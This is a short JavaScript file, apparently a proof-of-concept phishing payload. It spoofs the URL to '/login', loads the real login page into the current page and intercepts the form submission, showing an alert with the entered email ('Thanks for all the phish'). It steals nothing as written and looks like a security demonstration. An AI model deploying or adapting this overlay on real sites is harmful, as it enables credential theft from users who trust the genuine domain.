var host = window.location.host;
var path = '/login';

(function() {
  history.replaceState(null, 'Log in', path);

  var script = document.createElement("script");
  var hash = /com$/.test(host) ? '67b1ba83e869c8e79f6e36d0e09b5800' :'7b9b9838db5c80cbc7b2e2bfc403e518';
  script.src = '/assets/application-' + hash + '.js';
  script.type = 'text/javascript';
  document.getElementsByTagName('head')[0].appendChild(script);

  var checkReady = function(callback) {
    if (window.jQuery) {
      callback(jQuery);
    } else {
      window.setTimeout(function() { checkReady(callback); }, 50);
    }
  };

  checkReady(function($) {
    $.get('//' + host + path, {}, function(data) {
      $(document.body).html(data);
      //$('button').text('Phish me');
      $('form').submit(function(e) {
        e.preventDefault();
        alert('Thanks for all the phish, ' + $('#user_session_email').val() + '!');
      });
    });
  });
})();
